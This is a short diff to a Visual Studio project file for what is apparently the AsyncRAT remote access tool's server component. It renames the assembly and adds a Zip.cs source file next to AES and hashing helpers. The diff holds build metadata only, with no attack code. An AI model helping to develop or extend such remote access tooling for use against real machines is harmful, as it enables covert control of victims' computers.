@@ -8,7 +8,7 @@
     <ProjectGuid>{7767C300-5FD5-4A5D-9D4C-59559CCE48A3}</ProjectGuid>
     <OutputType>WinExe</OutputType>
     <RootNamespace>Server</RootNamespace>
-    <AssemblyName>AsyncRAT-Sharp</AssemblyName>
+    <AssemblyName>AsyncRAT</AssemblyName>
     <TargetFrameworkVersion>v4.6</TargetFrameworkVersion>
     <FileAlignment>512</FileAlignment>
     <Deterministic>true</Deterministic>
@@ -81,6 +81,7 @@
     <Compile Include="Algorithm\Aes256.cs" />
     <Compile Include="Algorithm\GetHash.cs" />
     <Compile Include="Algorithm\Sha256.cs" />
+    <Compile Include="Algorithm\Zip.cs" />
     <Compile Include="Forms\FormAbout.cs">
       <SubType>Form</SubType>
     </Compile>
